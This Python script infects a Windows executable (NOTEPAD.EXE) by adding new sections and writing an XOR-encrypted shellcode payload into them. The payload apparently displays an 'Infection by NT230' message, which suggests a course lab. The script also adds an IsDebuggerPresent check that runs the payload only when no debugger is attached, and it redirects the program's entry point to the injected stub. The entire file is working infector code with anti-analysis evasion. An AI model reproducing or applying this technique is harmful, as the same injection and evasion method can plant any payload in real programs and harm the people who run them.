import pefile
import os
import mmap
import struct

# Quick function to align our values
def align(val_to_align, alignment):
    return int((val_to_align + alignment - 1) / alignment) * alignment
    
#XOR
def bitwise_xor_bytes(a, b):
    result_int = list(struct.unpack(">i", a))[0] ^ list(struct.unpack(">i", b))[0]
    return struct.pack(">i", result_int)
    
'''----------------------------------ADD THREE SECTION----------------------------------'''
exe_path='NOTEPAD.EXE'

#******************add section .code******************

original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

# Look for valid values for the new section header
raw_size = align(0x200, file_alignment)
virtual_size = align(0x200, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

characteristics = 0xE0000020
name = ".code" + (3 * '\x00')
last_section = pe.sections[-1]
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.__unpack__(bytearray(new_section.sizeof()))
new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

new_section.Name = name
new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
new_section.VirtualAddress = virtual_offset
new_section.SizeOfRawData = raw_size
new_section.PointerToRawData = raw_offset
new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations \
                                 = new_section.NumberOfLinenumbers = 0x0
new_section.Characteristics = characteristics

pe.sections.append(new_section)
pe.__structures__.append(new_section)


pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

exe_path='NOTEPAD2.EXE'
pe.write(exe_path)
pe = pefile.PE(exe_path)


#******************add section .virus******************

original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

raw_size = align(0x200, file_alignment)
virtual_size = align(0x200, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

characteristics = 0xE0000020

name = ".virus" + (2 * '\x00')
last_section = pe.sections[-1]
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.__unpack__(bytearray(new_section.sizeof()))
new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

new_section.Name = name
new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
new_section.VirtualAddress = virtual_offset
new_section.SizeOfRawData = raw_size
new_section.PointerToRawData = raw_offset
new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations \
                                 = new_section.NumberOfLinenumbers = 0x0
new_section.Characteristics = characteristics

pe.sections.append(new_section)
pe.__structures__.append(new_section)


pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

exe_path='NOTEPAD2.EXE'
pe.write(exe_path)
pe = pefile.PE(exe_path)

#******************add section .virus******************

original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

raw_size = align(0x600, file_alignment)
virtual_size = align(0x600, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

characteristics = 0xE0000020

name = ".api" + (4 * '\x00')
last_section = pe.sections[-1]
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.__unpack__(bytearray(new_section.sizeof()))
new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

new_section.Name = name
new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
new_section.VirtualAddress = virtual_offset
new_section.SizeOfRawData = raw_size
new_section.PointerToRawData = raw_offset
new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations \
                                 = new_section.NumberOfLinenumbers = 0x0
new_section.Characteristics = characteristics

pe.sections.append(new_section)
pe.__structures__.append(new_section)


pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

exe_path='NOTEPAD2.EXE'
pe.write(exe_path)
pe = pefile.PE(exe_path)

print(pe.sections[-3])
print(pe.sections[-2])
print(pe.sections[-1])

#pe.section[-3] ----> section .code
#pe.section[-2] ----> section .virus
#pe.section[-1] ----> section .api
'''----------------------------------MODIFY SECTION .VIRUS----------------------------------'''
#Shellcode virus plaintext
virus = bytes(b"\xD9\xEB\x9B\xD9\x74\x24\xF4\x31\xD2\xB2\x77\x31\xC9\x64"
        b"\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x46\x08\x8B\x7E"
        b"\x20\x8B\x36\x38\x4F\x18\x75\xF3\x59\x01\xD1\xFF\xE1\x60"
        b"\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x54\x28\x78\x01\xEA\x8B"
        b"\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34\x8B\x01"
        b"\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF\x0D"
        b"\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B\x5A\x24\x01"
        b"\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01"
        b"\xE8\x89\x44\x24\x1C\x61\xC3\xB2\x08\x29\xD4\x89\xE5\x89"
        b"\xC2\x68\x8E\x4E\x0E\xEC\x52\xE8\x9F\xFF\xFF\xFF\x89\x45"
        b"\x04\xBB\x7E\xD8\xE2\x73\x87\x1C\x24\x52\xE8\x8E\xFF\xFF"
        b"\xFF\x89\x45\x08\x68\x6C\x6C\x20\x41\x68\x33\x32\x2E\x64"
        b"\x68\x75\x73\x65\x72\x30\xDB\x88\x5C\x24\x0A\x89\xE6\x56"
        b"\xFF\x55\x04\x89\xC2\x50\xBB\xA8\xA2\x4D\xBC\x87\x1C\x24"
        b"\x52\xE8\x5F\xFF\xFF\xFF\x68\x33\x30\x58\x20\x68\x20\x4E"
        b"\x54\x32\x68\x6E\x20\x62\x79\x68\x63\x74\x69\x6F\x68\x49"
        b"\x6E\x66\x65\x31\xDB\x88\x5C\x24\x12\x89\xE3\x68\x33\x39"
        b"\x58\x20\x68\x35\x32\x31\x34\x68\x33\x2D\x31\x39\x68\x32"
        b"\x30\x31\x38\x68\x2D\x31\x39\x35\x68\x32\x33\x30\x37\x68"
        b"\x31\x39\x35\x32\x31\xC9\x88\x4C\x24\x1A\x89\xE1\x31\xD2"
        b"\x6A\x40\x53\x51\x52\xFF\xD0")

#Return to address of old entry point        
mov_eax_value = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
print(hex(mov_eax_value ))
virus += b"\xB8" + struct.pack("<i", mov_eax_value)  + b"\xFF\xD0\x00\x00"
address = pe.sections[-2].VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
length_virus = 296

#XOR all plaintext of virus to ciphertext
cipher = b""
for i in range(74):
    a = virus[4*i:4*i+4]
    b = struct.pack("<i", address + 4*i)
    c = struct.pack("<i", length_virus)
    length_virus = length_virus - 4
    cipher += bitwise_xor_bytes(bitwise_xor_bytes(a,c),b)

#Write ciphertext virus to section .virus
raw_offset_virus = pe.sections[-2].PointerToRawData
pe.set_bytes_at_offset(raw_offset_virus, bytes(cipher))
pe.write(exe_path)

'''----------------------------------MODIFY SECTION .API----------------------------------'''
'''This section contain API call IsDebuggerPresent that is created by compiling shellcode in C'''
is_debugg = bytes(b"\x56\x8B\xF4\x83\xE4\xF0\x83\xEC\x20\xE8\x04\x00\x00\x00\x8B\xE6\x5E\xC3\x55\x8B\xEC\x83\xEC\x3C\xB8\x6B\x00\x00\x00\x66\x89\x45\xC4\xB9\x65\x00\x00\x00\x66\x89"
		      b"\x4D\xC6\xBA\x72\x00\x00\x00\x66\x89\x55\xC8\xB8\x6E\x00\x00\x00\x66\x89\x45\xCA\xB9\x65\x00\x00\x00\x66\x89\x4D\xCC\xBA\x6C\x00\x00\x00\x66\x89\x55\xCE\xB8\x33"
		      b"\x00\x00\x00\x66\x89\x45\xD0\xB9\x32\x00\x00\x00\x66\x89\x4D\xD2\xBA\x2E\x00\x00\x00\x66\x89\x55\xD4\xB8\x64\x00\x00\x00\x66\x89\x45\xD6\xB9\x6C\x00\x00\x00\x66"
		      b"\x89\x4D\xD8\xBA\x6C\x00\x00\x00\x66\x89\x55\xDA\x33\xC0\x66\x89\x45\xDC\xC6\x45\xE0\x49\xC6\x45\xE1\x73\xC6\x45\xE2\x44\xC6\x45\xE3\x65\xC6\x45\xE4\x62\xC6\x45"
		      b"\xE5\x75\xC6\x45\xE6\x67\xC6\x45\xE7\x67\xC6\x45\xE8\x65\xC6\x45\xE9\x72\xC6\x45\xEA\x50\xC6\x45\xEB\x72\xC6\x45\xEC\x65\xC6\x45\xED\x73\xC6\x45\xEE\x65\xC6\x45"
		      b"\xEF\x6E\xC6\x45\xF0\x74\xC6\x45\xF1\x00\x8D\x4D\xC4\x51\xE8\xA7\x01\x00\x00\x83\xC4\x04\x89\x45\xFC\x83\x7D\xFC\x00\x75\x07\xB8\x01\x00\x00\x00\xEB\x36\x8D\x55"
		      b"\xE0\x52\x8B\x45\xFC\x50\xE8\x2D\x00\x00\x00\x83\xC4\x08\x89\x45\xF8\x83\x7D\xF8\x00\x75\x07\xB8\x02\x00\x00\x00\xEB\x16\x8B\x4D\xF8\x89\x4D\xF4\xFF\x55\xF4\x85"
		      b"\xC0\x75\x07\xB8\x03\x00\x00\x00\xEB\x02\x33\xC0\x8B\xE5\x5D\xC3\x55\x8B\xEC\x83\xEC\x3C\x8B\x45\x08\x89\x45\xEC\x8B\x4D\xEC\x0F\xB7\x11\x81\xFA\x4D\x5A\x00\x00"
		      b"\x74\x07\x33\xC0\xE9\x35\x01\x00\x00\x8B\x45\xEC\x8B\x4D\x08\x03\x48\x3C\x89\x4D\xE4\xBA\x08\x00\x00\x00\x6B\xC2\x00\x8B\x4D\xE4\x8D\x54\x01\x78\x89\x55\xE8\x8B"
		      b"\x45\xE8\x83\x38\x00\x75\x07\x33\xC0\xE9\x08\x01\x00\x00\x8B\x4D\xE8\x8B\x11\x89\x55\xE0\x8B\x45\xE0\x03\x45\x08\x89\x45\xF4\x8B\x4D\xF4\x8B\x51\x18\x89\x55\xDC"
		      b"\x8B\x45\xF4\x8B\x48\x1C\x89\x4D\xD0\x8B\x55\xF4\x8B\x42\x20\x89\x45\xD8\x8B\x4D\xF4\x8B\x51\x24\x89\x55\xD4\xC7\x45\xF8\x00\x00\x00\x00\xEB\x09\x8B\x45\xF8\x83"
		      b"\xC0\x01\x89\x45\xF8\x8B\x4D\xF8\x3B\x4D\xDC\x0F\x83\xB3\x00\x00\x00\x8B\x55\x08\x03\x55\xD8\x8B\x45\xF8\x8D\x0C\x82\x89\x4D\xC8\x8B\x55\x08\x03\x55\xD4\x8B\x45"
		      b"\xF8\x8D\x0C\x42\x89\x4D\xCC\x8B\x55\x08\x03\x55\xD0\x8B\x45\xCC\x0F\xB7\x08\x8D\x14\x8A\x89\x55\xC4\x8B\x45\xC8\x8B\x4D\x08\x03\x08\x89\x4D\xF0\xC7\x45\xFC\x00"
		      b"\x00\x00\x00\xC7\x45\xFC\x00\x00\x00\x00\xEB\x09\x8B\x55\xFC\x83\xC2\x01\x89\x55\xFC\x8B\x45\x0C\x03\x45\xFC\x0F\xBE\x08\x85\xC9\x74\x27\x8B\x55\xF0\x03\x55\xFC"
		      b"\x0F\xBE\x02\x85\xC0\x74\x1A\x8B\x4D\x0C\x03\x4D\xFC\x0F\xBE\x11\x8B\x45\xF0\x03\x45\xFC\x0F\xBE\x08\x3B\xD1\x74\x02\xEB\x02\xEB\xC3\x8B\x55\x0C\x03\x55\xFC\x0F"
		      b"\xBE\x02\x85\xC0\x75\x19\x8B\x4D\xF0\x03\x4D\xFC\x0F\xBE\x11\x85\xD2\x75\x0C\x8B\x45\xC4\x8B\x4D\x08\x03\x08\x8B\xC1\xEB\x07\xE9\x38\xFF\xFF\xFF\x33\xC0\x8B\xE5"
		      b"\x5D\xC3\x55\x8B\xEC\x83\xEC\x34\xC7\x45\xE4\x00\x00\x00\x00\x64\xA1\x30\x00\x00\x00\x89\x45\xE4\x8B\x4D\xE4\x8B\x51\x0C\x89\x55\xD8\x8B\x45\xD8\x8B\x48\x0C\x8B"
		      b"\x50\x10\x89\x4D\xCC\x89\x55\xD0\x8B\x45\xCC\x89\x45\xD4\x8B\x4D\xD4\x89\x4D\xE8\x83\x7D\xE8\x00\x0F\x84\x5A\x01\x00\x00\x8B\x55\xE8\x83\x7A\x18\x00\x0F\x84\x4D"
		      b"\x01\x00\x00\x8B\x45\xE8\x83\x78\x30\x00\x75\x02\xEB\xDE\x8B\x4D\xE8\x8B\x51\x30\x89\x55\xEC\xC7\x45\xF0\x00\x00\x00\x00\xC7\x45\xF0\x00\x00\x00\x00\xEB\x09\x8B"
		      b"\x45\xF0\x83\xC0\x01\x89\x45\xF0\x8B\x4D\xF0\x8B\x55\x08\x0F\xB7\x04\x4A\x85\xC0\x0F\x84\xDD\x00\x00\x00\x8B\x4D\xF0\x8B\x55\xEC\x0F\xB7\x04\x4A\x85\xC0\x0F\x84"
		      b"\xCB\x00\x00\x00\x8B\x4D\xF0\x8B\x55\x08\x0F\xB7\x04\x4A\x83\xF8\x5A\x7F\x37\x8B\x4D\xF0\x8B\x55\x08\x0F\xB7\x04\x4A\x83\xF8\x41\x7C\x28\x8B\x4D\xF0\x8B\x55\x08"
		      b"\x0F\xB7\x04\x4A\x83\xC0\x20\x89\x45\xE0\x8B\x4D\xF0\x8B\x55\x08\x66\x8B\x45\xE0\x66\x89\x04\x4A\x66\x8B\x4D\xE0\x66\x89\x4D\xFE\xEB\x0E\x8B\x55\xF0\x8B\x45\x08"
		      b"\x66\x8B\x0C\x50\x66\x89\x4D\xFE\x66\x8B\x55\xFE\x66\x89\x55\xF8\x8B\x45\xF0\x8B\x4D\xEC\x0F\xB7\x14\x41\x83\xFA\x5A\x7F\x37\x8B\x45\xF0\x8B\x4D\xEC\x0F\xB7\x14"
		      b"\x41\x83\xFA\x41\x7C\x28\x8B\x45\xF0\x8B\x4D\xEC\x0F\xB7\x14\x41\x83\xC2\x20\x89\x55\xDC\x8B\x45\xF0\x8B\x4D\xEC\x66\x8B\x55\xDC\x66\x89\x14\x41\x66\x8B\x45\xDC"
		      b"\x66\x89\x45\xFC\xEB\x0E\x8B\x4D\xF0\x8B\x55\xEC\x66\x8B\x04\x4A\x66\x89\x45\xFC\x66\x8B\x4D\xFC\x66\x89\x4D\xF4\x0F\xB7\x55\xF8\x0F\xB7\x45\xF4\x3B\xD0\x74\x02"
		      b"\xEB\x05\xE9\x08\xFF\xFF\xFF\x8B\x4D\xF0\x8B\x55\x08\x0F\xB7\x04\x4A\x85\xC0\x75\x16\x8B\x4D\xF0\x8B\x55\xEC\x0F\xB7\x04\x4A\x85\xC0\x75\x08\x8B\x4D\xE8\x8B\x41"
		      b"\x18\xEB\x0F\x8B\x55\xE8\x8B\x02\x89\x45\xE8\xE9\x9C\xFE\xFF\xFF\x33\xC0\x8B\xE5\x5D\xC3")
		      
#Write is_debugg to section .api
raw_offset_api = pe.sections[-1].PointerToRawData
pe.set_bytes_at_offset(raw_offset_api, bytes(is_debugg))
pe.write(exe_path)

'''----------------------------------MODIFY SECTION .CODE----------------------------------'''
#call IsDebuggerPresent()
call_offset_to_isdebugg = pe.sections[-1].VirtualAddress - pe.sections[-3].VirtualAddress - 5
shellcode = b"\xE8" + struct.pack("<i", call_offset_to_isdebugg)

#check Debugger. If not, decrypt virus section.
shellcode += b"\x83\xF8\x00\x0F\x85\x07\x00\x00\x00"

#Return to address of entry point if debugging detected, if not go to decryptor
shellcode += b"\xB8" + struct.pack("<i", mov_eax_value)  + b"\xFF\xD0"

#lea esi, virus
virtual_address_virus = pe.sections[-2].VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
shellcode += b"\x8D\x35" + struct.pack("<i", virtual_address_virus)

#decryptor if not dectect debugger
shellcode += b"\xB9\x28\x01\x00\x00\x31\x0E\x31\x36\x83\xC6\x04\x83\xE9\x04\x83\xF9\x00\x0F\x85\xED\xFF\xFF\xFF"

#Call virus after decrypted
call_offset_virus = pe.sections[-2].VirtualAddress - (pe.sections[-3].VirtualAddress + 0x33) - 5 
shellcode += b"\xE8" + struct.pack("<i", call_offset_virus)

#Write shellcode to section .code
raw_offset_code = pe.sections[-3].PointerToRawData
pe.set_bytes_at_offset(raw_offset_code, bytes(shellcode))
pe.write(exe_path)

'''----------------------------------CHANGE ADDRESS OF ENTRY POINT----------------------------------'''
new_ep = pe.sections[-3].VirtualAddress
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
pe.write(exe_path)




















